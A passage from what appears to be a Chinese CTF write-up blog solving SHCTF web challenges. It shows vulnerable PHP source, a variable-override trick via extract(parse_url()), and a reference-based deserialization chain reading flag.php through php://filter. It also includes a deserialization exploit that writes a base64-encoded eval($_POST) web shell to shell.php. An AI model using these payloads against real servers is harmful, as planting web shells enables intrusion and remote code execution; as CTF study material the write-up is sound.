<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$$$scheme</span><span class="token operator">===</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">!=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag is"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先通过第一个if</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$$$scheme</span><span class="token operator">===</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里<code>extract(parse_url($_POST[&#39;SHCTF&#39;]));</code>是将传入的SHCTF值的一部分再作为参数。<code>extract</code>会涉及到变量覆盖漏洞<br>参考资料<a href="https://www.cnblogs.com/xhds/p/12587249.html#_label5">PHP中的变量覆盖漏洞</a><br>在这里做一个测试：<br>比如说这一段代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'http://sd.com:12/as.php?s=456'</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/*
打印结果：
Array
(
    [scheme] => http
    [host] => sd.com
    [port] => 12
    [path] => /as.php
    [query] => s=456
)
*/</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我们将<code>http</code>改为<code>host</code>，将<code>sd.com</code>改为<code>query</code>，将<code>s=456</code>改为<code>SHCTF</code><br>也就是以下代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'host://query/sd.php?SHCTF'</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*
运行结果：
Array
(
    [scheme] => host
    [host] => query
    [path] => /sd.php
    [query] => SHCTF
)
*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里正好实现三次变量覆盖，输出了flag的md5值<br><img src="https://img-blog.csdnimg.cn/c14c045f09a9418bb0382e89e8f99724.png" alt="1"><br>接下来通过下面的代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">!=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个好弄，就是将length赋值为带有三位小数的数值<code>length=132.456</code>，返回flag长度42。</p>
<blockquote>
<p>到这已经知道了：<br>flag.md5&#x3D;2f679a35b591a420d8cc6b60f90d3fb1<br>flag.length&#x3D;42</p>
<p>后面这个其实也知道<code>哈希拓展攻击</code>，可是好像找的脚本不能用了。唉，复现一下。。。<br>使用脚本（<a href="https://github.com/shellfeel/hash-ext-attack">脚本地址</a>）<br><img src="https://img-blog.csdnimg.cn/2d34bb2cb1de4c5085c00c2ebca01da1.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/d4c7e7d9e3674f8694e493d9d887fc01.png" alt="3"></p>
</blockquote>
<h3 id="WEEK2-serialize"><a href="#WEEK2-serialize" class="headerlink" title="[WEEK2]serialize"></a>[WEEK2]serialize</h3><p>知识点：浅拷贝、反序列化<br>分享文章：<a href="https://blog.csdn.net/crisprx/article/details/104457047">从两道题目浅谈PHP深浅拷贝</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">misca</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$gao</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fei</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">miaomiao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">gao</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fei</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">miaomiao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token string single-quoted-string">'Mikey Mouse~'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">musca</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$ding</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$dong</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ding</span><span class="token operator">-></span><span class="token property">dong</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">milaoshu</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$v</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span><span class="token string double-quoted-string">"misca~musca~milaoshu~~~"</span><span class="token punctuation">;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^O:\d+/'</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you should think harder!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"wanna_fl.ag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>又是一道反序列化题目，不会就多补补。<br>串一下链子：</p>
<blockquote>
<p>musca-&gt;misca-&gt;milaoshu<br>最后使用php伪协议来读取flag.php文件。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/d498fd23f9f1421ab5eda7a7459ab1a1.png" alt="123"><br>链子：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">misca</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$gao</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fei</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">gao</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span><span class="token comment">//重点</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">musca</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$ding</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$dong</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">milaoshu</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$v</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=flag.php'</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">musca</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">ding</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">misca</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">ding</span><span class="token operator">-></span><span class="token property">fei</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">milaoshu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//array绕过数组</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="WEEK3-sseerriiaalliizzee"><a href="#WEEK3-sseerriiaalliizzee" class="headerlink" title="[WEEK3]sseerriiaalliizzee"></a>[WEEK3]sseerriiaalliizzee</h3><p>知识点：反序列化、file_put_contents利用<br>文章分享：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$barking</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span><span class="token operator">-></span><span class="token function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span> 
    <span class="token keyword">public</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$part1</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$part2</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part1</span> <span class="token operator">=</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part2</span> <span class="token operator">=</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>
        
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$useless</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php die("+Genshin Impact Start!+");?>'</span><span class="token punctuation">;</span>
        <span class="token variable">$useful</span><span class="token operator">=</span> <span class="token variable">$useless</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">part2</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span> <span class="token property">part1</span><span class="token punctuation">,</span><span class="token variable">$useful</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./flag,php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"barking for fun!"</span><span class="token punctuation">;</span>
        
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
       <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no way, fuck off"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>串好链子：</p>
<blockquote>
<p>Start-&gt;CTF-&gt;Flag</p>
</blockquote>
<p>exp:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$barking</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span><span class="token operator">-></span><span class="token function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$part1</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$part2</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part1</span> <span class="token operator">=</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part2</span> <span class="token operator">=</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$useless</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php die("+Genshin Impact Start!+");?>'</span><span class="token punctuation">;</span>
        <span class="token variable">$useful</span><span class="token operator">=</span> <span class="token variable">$useless</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">part2</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span> <span class="token property">part1</span><span class="token punctuation">,</span><span class="token variable">$useful</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./flag,php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"barking for fun!"</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">barking</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">part1</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php"</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">part2</span><span class="token operator">=</span><span class="token string single-quoted-string">'PD8gZXZhbCgkX1BPU1RbMV0pOw=='</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>0xGame-2023</title>
    <url>/2023/10/06/0xGame-2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

